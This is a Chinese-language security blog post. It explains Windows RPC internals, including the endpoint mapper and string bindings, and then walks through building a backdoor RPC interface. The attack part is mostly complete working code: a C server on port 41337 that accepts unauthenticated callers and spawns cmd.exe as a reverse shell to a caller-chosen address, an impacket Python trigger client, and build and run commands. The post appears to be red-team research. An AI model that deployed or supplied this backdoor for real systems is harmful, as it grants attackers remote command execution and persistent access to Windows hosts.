## RPC简介

全称为 **R** emote **P** rocedure **C**
all（远程过程调用），是Windows操作系统内部的一种机制，应用于程序之间的相互通信。RPC 的总体思路是可以编写在本地和远程执行代码的应用程序。

误区：似乎像远程服务器的基本 TCP 连接。但是在使用RPC接口的过程中，我们不需要处理网络的输入/输出或者TCP栈。事实上与网络相关的一切都由 **RPC
runtime library** (rpcrt4.dll) 和一个 **存根** 处理。而存根目的是将数据打包（即序列化）到一个数据存根中。

##  **epmapper**

RPC 架构中最重要的服务之一：epmapper（RPC Endpoint Mapper）。此服务负责列出公开的接口。

![1654088074_6297618a7c24308444595.png!small?1654088074698](https://image.3001.net/images/20220601/1654088074_6297618a7c24308444595.png!small?1654088074698)

可使用impacket包中的rpcdumps.py列出所有的RPC接口

    
    
    python rpcdump.py @10.211.55.3 > 3.txt

## RPC工作流程

调用 RPC 接口的过程依赖于两个步骤。

  *     * 首先，客户端将使用所谓的 **字符串绑定** 连接到端点

例：SAMR 接口，系统管理员使用此界面远程管理用户和组。

![1654088185_629761f99f46133181119.png!small?1654088186073](https://image.3001.net/images/20220601/1654088185_629761f99f46133181119.png!small?1654088186073)

        
                Prtocol：用于与远程服务器通信的协议
        Provider：提供的程序，EXE 或 DLL
        UUID：WindowsOS通用唯一识别码 (Universally Unique Identifier)
        Bindings：绑定字符串。
        字符串绑定定义了如何到达 RPC 接口
        字符串绑定的统一格式ObjectUUID@ProtocolSequence:NetworkAddress[Endpoint,Option]
        ObjectUUID：我们希望连接的UUID以及版本
        ProtocolSequence：用于通过网络传输数据的协议。共有三种主要协议
            NCACN：RPC over a TCP connection
            NCADG：RPC over a UDP connection
            NCALRPC：RPC through a local connection
        NetworkAddress：IP
        Endpoint：远程接口地址
        

**ncacn_ip_tcp:10.211.55.3[49664]**

我们可以通过在端口 49664 上连接到 IP 10.211.55.3来推断出 RPC 接口是可达的。如果我们取这个：

 **ncalrpc:[samss lpc]**

我们可以看到没有 NetworkAddress。这是因为此字符串绑定依赖于`ncalrpc`协议序列，这意味着 RPC 接口只能通过调用名为 **samss
lpc** 的端点在本地访问。最后，如果我们采用以下方法：

 **ncacn_np:\\\LHC[\pipe\lsass]**

我们可以通过将位于名为 \\\LHC的计算机上的 SMB 共享连接到名称管道 \pipe\lsass 来推断该接口是可访问的。

    * 下一步是绑定到接口

我们需要 epmapper 再次公开的两条信息：接口的 UUID 及其版本。

绑定过程将在 RPC 客户端和 RPC 服务器之间创建逻辑连接

抓包分析：

![1654088383_629762bfbf99b912c3930.png!small?1654088384334](https://image.3001.net/images/20220601/1654088383_629762bfbf99b912c3930.png!small?1654088384334)

前三个包为标准的TCP连接包，端点正在侦听端口 41337（这是我们选择的后门端口），对应第一步

意思是通过10.211.55.3:41337连接到端口，字符串绑定如下：

`ncacn_ip_tcp:10.211.55.3[41337]`

后四个紫色的数据包构成了 DCERPC (**分布式计算环境中的 RPC,就像函数原型。理解不深)**绑定操作和 RPC 调用

第一个数据包尝试绑定 UUID 和接口版本

![1654088417_629762e181db2b0d411e7.png!small?1654088418378](https://image.3001.net/images/20220601/1654088417_629762e181db2b0d411e7.png!small?1654088418378)第二个数据包是来自RPC服务器的回复，已接收绑定

![1654088448_629763008df6496b400e4.png!small?1654088449174](https://image.3001.net/images/20220601/1654088448_629763008df6496b400e4.png!small?1654088449174)第三个包含客户端以序列化格式发送到
RPC 接口的数据存根

![1654088470_629763160e5d37b1cb161.png!small?1654088471249](https://image.3001.net/images/20220601/1654088470_629763160e5d37b1cb161.png!small?1654088471249)

一旦数据被格式化，它将被转发到 **RPC runtime library** 。

服务器存根反序列化数据并将其转发到服务器代码。

## 接口构建

定义我们接口的 IDL 文件

    
    
    [
    	uuid(AB4ED934-1293-10DE-BC12-AE18C48DEF33),
    	version(1.0),
    	implicit_handle(handle_t ImplicitHandle)
    ]
    interface RemotePrivilegeCall
    {
    	void SendReverseShell(
    		[in, string] wchar_t* ip_address,
    		[in] int port
    	);
    }
    

前一部分是 **MIDL 接口头，它包含接口的 UUID（我随机选择）、它的版本和要使用的绑定句柄的类型。**

下一部分是 **MIDL 接口主体** ，其中包含我们的 RPC 接口函数的定义

使用midl.exe编译为C代码

– 一个客户端存根 (RemotePrivilegeCall_c.c)

– 一个服务器存根 (RemotePrivilege_s.c)

– 每个存根中包含一个标头

![1654088516_62976344c28081e691127.png!small?1654088516929](https://image.3001.net/images/20220601/1654088516_62976344c28081e691127.png!small?1654088516929)

  *  **服务端（目标机器）代码**
    
        #include <stdlib.h>
    #include <iostream>
    #include <winsock2.h>
    #include <windows.h>
    #include "RemotePrivilegeCall.h"
    // Links the rpcrt4.lib that exposes the WinAPI RPC functions
    #pragma comment(lib, "rpcrt4.lib")
    // Links the ws2_32.lib which contains the socket functions
    #pragma comment(lib, "ws2_32.lib")
    
    // Function that sends the reverse shell
    void SendReverseShell(wchar_t* ip_address, int port){
    	printf("Sending reverse shell to: %ws:%d\\n", ip_address, port);
    	WSADATA wsaData;
    	SOCKET s1;
    	struct sockaddr_in hax;
    	char ip_addr_ascii[16];
    	STARTUPINFO sui;
    	PROCESS_INFORMATION pi;
    	sprintf(ip_addr_ascii, "%ws", ip_address );
    	WSAStartup(MAKEWORD(2, 2), &wsaData);
    	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    
    	hax.sin_family = AF_INET;
    	hax.sin_port = htons(port);
    	hax.sin_addr.s_addr = inet_addr(ip_addr_ascii);
    
    	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    
    	memset(&sui, 0, sizeof(sui));
    	sui.cb = sizeof(sui);
    	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
    
    	LPSTR commandLine = "cmd.exe";
    	CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, π);
    }
    
    // Security callback function
    RPC_STATUS CALLBACK SecurityCallback(RPC_IF_HANDLE Interface, void* pBindingHandle){
        return RPC_S_OK; // Whoever binds to the interface, we will allow the connection
    }
    
    int main()
    {
        RPC_STATUS status; // Used to store the RPC function returns
    	RPC_BINDING_VECTOR* pbindingVector = 0;
    
    	// Specify the Rpc endpoints options
    	status = RpcServerUseProtseqEpW(
    		(RPC_WSTR)L"ncacn_ip_tcp",      // Endpoint to contact
    		RPC_C_PROTSEQ_MAX_REQS_DEFAULT, // Default value
    		(RPC_WSTR)L"41337",             // Listening port 
    		NULL                            // Pointer to a security context (we don't care about that)
    	);                         
    
    	// Register the interface to the RPC runtime
    	status = RpcServerRegisterIf2(
    		RemotePrivilegeCall_v1_0_s_ifspec,   // Name of the interface defined in RemotePrivilegeCall.h
    		NULL,                                // UUID to bind to (NULL means the one from the MIDL file)
    		NULL,                                // Interface to use (NULL means the one from the MIDL file)
    		RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH, // Invoke the security callback function
    		RPC_C_LISTEN_MAX_CALLS_DEFAULT,      // Numbers of simultaneous connections
    		(unsigned)-1,                        // Maximum size of data block received 
    		SecurityCallback                     // Name of the function that acts as the security callback
    	);                   
    
    	// Register the interface to the epmapper
    	status = RpcServerInqBindings(&pbindingVector);
    	status = RpcEpRegisterW(
    		RemotePrivilegeCall_v1_0_s_ifspec,   // Name of the interface defined in RemotePrivilegeCall.h
    		pbindingVector,                      // Structure contening the binding vectors
    		0,                                   // 
    		(RPC_WSTR)L"Backdoor RPC interface"  // Name of the interface as exposed on port 135    
    	);
    
    	// Launch the interface
    	status = RpcServerListen(
    		1,                                   // Minimum number of connections
    		RPC_C_LISTEN_MAX_CALLS_DEFAULT,      // Maximum number of connetions
    		FALSE                                // Starts the interface immediately
    	);                              
    }
    
    // Function used to allocate memory to the interface
    void* __RPC_USER midl_user_allocate(size_t size){
        return malloc(size);
    }
    
    // Function used to free memory allocated to the interface
    void __RPC_USER midl_user_free(void* p){
        free(p);
    }
    

使用cl.exe将服务器程序和服务器存根编译成一个二进制文件

    
    
    cl.exe Server.cpp RemotePrivilegeCall_s.c
    

**验证方式：**

使用rpcdumps.py枚举 epmapper

![1654088594_629763926828f93fcac83.png!small?1654088594600](https://image.3001.net/images/20220601/1654088594_629763926828f93fcac83.png!small?1654088594600)

已能够正常工作

  *  **客户端代码**
    
        import argparse
    import time
    from impacket.dcerpc.v5 import transport
    from impacket.structure import Structure
    from impacket.uuid import uuidtup_to_bin
    from impacket.dcerpc.v5.ndr import NDRCALL
    from impacket.dcerpc.v5.dtypes import WSTR
    from impacket.dcerpc.v5.rpcrt import DCERPCException
    from impacket.dcerpc.v5.transport import DCERPCTransportFactory
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-rip", help="Remote computer to target", dest="target_ip", type=str, required=True)
    parser.add_argument("-rport", help="IP of the remote procedure listener", dest="port", type=int, required=True)
    parser.add_argument("-lip", help="Local IP to receive the reverse shell", dest="lip", type=str, required=True)
    parser.add_argument("-lport", help="Local port to receive the reverse shell", dest="lport", type=int, required=True)
    
    args = parser.parse_args()
    target_ip = args.target_ip
    port = args.port
    lip = args.lip
    lport = args.lport
    
    class SendReverseShell(NDRCALL):
        structure = (
            ('ip_address', WSTR),
            ('port', "<i")
        )
    
    # Creates the string binding
    stringBinding = r'ncacn_ip_tcp:{}[{}]'.format(target_ip, port)
    
    # Connects to the remote endpoint
    transport = DCERPCTransportFactory(stringBinding)
    dce = transport.get_dce_rpc()
    dce.connect()
    print("[*] Connected to the remote target")
    
    # Casts the UUID string and version of the interface into a UUID object and binds to the interface
    interface_uuid = uuidtup_to_bin(("AB4ED934-1293-10DE-BC12-AE18C48DEF33", "1.0"))
    dce.bind(interface_uuid)
    print("[*] Binded to AB4ED934-1293-10DE-BC12-AE18C48DEF33")
    
    print("[*] Formatting the client stub")
    # Creates the client stub and pack its data so it valid
    query = SendReverseShell()
    query['ip_address'] = f"{lip}\\x00"
    query['port'] = lport
    
    print("[*] Calling the remote procedure")
    try:
        # Calls the function number 0 (the first and only function exposed by our interface) and pass the data
        dce.call(0, query)
        # Reading the answer of the RPC server
        dce.recv()
    except Exception as e:
        print(f"[!] ERROR: {e}")
    finally:
        print("[*] Disconecting from the server")
        # Disconnecting from the remote target
        dce.disconnect()
    

**可调用impacket包实现**

    
    
    python trigger.py -rip 10.211.55.3 -rport 41337 -lip 10.211.55.10 -lport 9812
    

rip：目标机器

rport：目标机器连接端口

lip：反弹shell监听机器

lport：监听端口

  

## 测试

攻击机

![1654089103_6297658f41a4ae828bdba.png!small?1654089103624](https://image.3001.net/images/20220601/1654089103_6297658f41a4ae828bdba.png!small?1654089103624)

跳板机nc反弹shell

![1654089228_6297660cce3c134d8dc72.png!small?1654089229753](https://image.3001.net/images/20220601/1654089228_6297660cce3c134d8dc72.png!small?1654089229753)

目标机器

![1654089193_629765e91db52ec1e707d.png!small?1654089193364](https://image.3001.net/images/20220601/1654089193_629765e91db52ec1e707d.png!small?1654089193364)

## 参考资料

https://sensepost.com/blog/2021/building-an-offensive-rpc-interface/

https://github.com/sensepost/offensive-rpc

  

本文作者：深信服深蓝实验室_北京天雄战队

